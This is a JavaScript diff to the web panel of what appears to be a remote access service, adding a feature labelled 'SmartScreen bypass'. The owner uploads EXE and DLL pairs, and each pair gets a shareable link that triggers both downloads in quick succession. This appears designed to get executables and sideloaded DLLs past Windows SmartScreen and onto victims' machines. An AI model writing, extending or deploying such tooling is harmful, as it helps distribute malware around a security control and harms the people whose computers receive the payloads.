@@ -530,6 +530,7 @@ function showApp(a) {
   if (owner) loadEnrollLog();
   loadStats();
   loadAlerts();
+  if (owner) loadSmartscreen();
   fillSupport();
   loadSubscription();
   checkInstaller();
@@ -3786,3 +3787,141 @@ canvas.addEventListener('keydown', (e) => {
 });
 canvas.addEventListener('keyup', (e) => { if (!controlOn()) return; e.preventDefault(); if (pressed.has(e.code)) { pressed.delete(e.code); sendInput({ kind: 'key', code: e.code, down: false }); } });
 canvas.addEventListener('blur', () => { for (const c of pressed) sendInput({ kind: 'key', code: c, down: false }); pressed.clear(); });
+
+// --- SmartScreen bypass ---
+// Owner uploads EXE + DLL pairs. Each pair gets a shareable /smdl/<id> link
+// that triggers both file downloads simultaneously.
+let ssExeFile = null, ssDllFile = null;
+$('#ss-exe').addEventListener('change', (e) => {
+  ssExeFile = (e.target.files && e.target.files[0]) || null;
+  $('#ss-exe-label').textContent = ssExeFile ? ssExeFile.name : 'Select EXE file…';
+  $('#ss-exe-label').style.opacity = ssExeFile ? '1' : '0.7';
+});
+$('#ss-dll').addEventListener('change', (e) => {
+  ssDllFile = (e.target.files && e.target.files[0]) || null;
+  $('#ss-dll-label').textContent = ssDllFile ? ssDllFile.name : 'Select DLL file…';
+  $('#ss-dll-label').style.opacity = ssDllFile ? '1' : '0.7';
+});
+$('#ss-upload').addEventListener('click', async () => {
+  const name = ($('#ss-name').value || '').trim();
+  if (!name) { toast('Enter a name for this pair', 'err'); return; }
+  if (!ssExeFile) { toast('Select the EXE file', 'err'); return; }
+  if (!ssDllFile) { toast('Select the DLL file', 'err'); return; }
+  const btn = $('#ss-upload');
+  btn.disabled = true;
+  const setStatus = (t) => { $('#ss-upload-status').textContent = t; };
+  try {
+    setStatus('Uploading EXE…');
+    const r1 = await fetch('/api/smartscreen/exe?name=' + encodeURIComponent(name) + '&filename=' + encodeURIComponent(ssExeFile.name), {
+      method: 'POST', credentials: 'include',
+      headers: { 'Content-Type': 'application/octet-stream' },
+      body: ssExeFile,
+    });
+    const j1 = await r1.json();
+    if (!r1.ok) throw new Error(j1.error || 'EXE upload failed');
+    setStatus('Uploading DLL…');
+    const r2 = await fetch('/api/smartscreen/dll?id=' + encodeURIComponent(j1.id) + '&filename=' + encodeURIComponent(ssDllFile.name), {
+      method: 'POST', credentials: 'include',
+      headers: { 'Content-Type': 'application/octet-stream' },
+      body: ssDllFile,
+    });
+    const j2 = await r2.json();
+    if (!r2.ok) throw new Error(j2.error || 'DLL upload failed');
+    toast('Pair "' + name + '" uploaded', 'ok');
+    $('#ss-name').value = '';
+    ssExeFile = null; ssDllFile = null;
+    $('#ss-exe').value = ''; $('#ss-dll').value = '';
+    $('#ss-exe-label').textContent = 'Select EXE file…'; $('#ss-exe-label').style.opacity = '0.7';
+    $('#ss-dll-label').textContent = 'Select DLL file…'; $('#ss-dll-label').style.opacity = '0.7';
+    setStatus('');
+    loadSmartscreen();
+  } catch (err) {
+    toast('Upload failed: ' + err.message, 'err');
+    setStatus('');
+  }
+  btn.disabled = false;
+});
+
+function ssDualDownload(id, exeFilename, dllFilename) {
+  function dl(href, filename) {
+    const a = document.createElement('a'); a.href = href; a.download = filename;
+    a.style.display = 'none'; document.body.appendChild(a); a.click(); document.body.removeChild(a);
+  }
+  dl('/smdl/' + id + '/exe', exeFilename);
+  setTimeout(() => dl('/smdl/' + id + '/dll', dllFilename), 400);
+}
+
+function ssCopyLink(id) {
+  const url = location.origin + '/smdl/' + id;
+  navigator.clipboard.writeText(url).then(() => toast('Link copied', 'ok')).catch(() => toast(url, ''));
+}
+
+async function loadSmartscreen() {
+  const list = $('#ss-list');
+  if (!list) return;
+  try {
+    const r = await fetch('/api/smartscreen', { credentials: 'include' });
+    const j = await r.json();
+    if (!r.ok) throw new Error(j.error || 'failed');
+    renderSmartscreen(j.entries || []);
+  } catch (e) {
+    if (list) list.innerHTML = '<div style="opacity:.5;font-size:14px;padding:8px 0">Could not load: ' + (e.message || 'error') + '</div>';
+  }
+}
+
+function renderSmartscreen(entries) {
+  const list = $('#ss-list');
+  if (!list) return;
+  if (!entries.length) {
+    list.innerHTML = '<div style="opacity:.5;font-size:14px;padding:8px 0">No pairs uploaded yet. Upload your first EXE + DLL pair above.</div>';
+    return;
+  }
+  list.innerHTML = '';
+  for (const e of entries) {
+    const card = document.createElement('div');
+    card.style.cssText = 'background:#141c25;border:1px solid #223;border-radius:10px;padding:14px 16px;display:flex;flex-wrap:wrap;align-items:center;gap:12px';
+    const info = document.createElement('div');
+    info.style.cssText = 'flex:1;min-width:200px';
+    info.innerHTML = '<div style="font-weight:600;font-size:15px">' + (e.name || 'Unnamed').replace(/</g,'&lt;') + '</div>'
+      + '<div style="font-size:12px;opacity:.6;margin-top:3px">'
+      + (e.exeFilename || '').replace(/</g,'&lt;') + ' &nbsp;+&nbsp; '
+      + (e.dllFilename || '(DLL pending)').replace(/</g,'&lt;')
+      + '</div>';
+    card.appendChild(info);
+    const actions = document.createElement('div');
+    actions.style.cssText = 'display:flex;gap:8px;flex-wrap:wrap';
+    if (e.complete) {
+      const dlBtn = document.createElement('button');
+      dlBtn.className = 'btn primary small';
+      dlBtn.textContent = 'Download both';
+      dlBtn.addEventListener('click', () => ssDualDownload(e.id, e.exeFilename, e.dllFilename));
+      actions.appendChild(dlBtn);
+      const linkBtn = document.createElement('button');
+      linkBtn.className = 'btn ghost small';
+      linkBtn.textContent = 'Copy link';
+      linkBtn.addEventListener('click', () => ssCopyLink(e.id));
+      actions.appendChild(linkBtn);
+    } else {
+      const pend = document.createElement('span');
+      pend.style.cssText = 'font-size:12px;opacity:.6;padding:4px 0';
+      pend.textContent = 'Upload pending';
+      actions.appendChild(pend);
+    }
+    const delBtn = document.createElement('button');
+    delBtn.className = 'btn ghost small danger';
+    delBtn.innerHTML = '<svg viewBox="0 0 24 24" class="ic" style="width:14px;height:14px"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6M9 6V4h6v2"/></svg>';
+    delBtn.title = 'Delete';
+    delBtn.addEventListener('click', async () => {
+      const ok = await modal({ title: 'Delete pair?', message: 'Remove "' + (e.name || 'this pair').replace(/</g,'&lt;') + '"? The files will be deleted.', confirmText: 'Delete', danger: true });
+      if (!ok) return;
+      try {
+        const r = await fetch('/api/smartscreen', { method: 'DELETE', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: e.id }) });
+        if (!r.ok) throw new Error((await r.json()).error || 'failed');
+        toast('Deleted', 'ok'); loadSmartscreen();
+      } catch (err) { toast('Delete failed: ' + err.message, 'err'); }
+    });
+    actions.appendChild(delBtn);
+    card.appendChild(actions);
+    list.appendChild(card);
+  }
+}
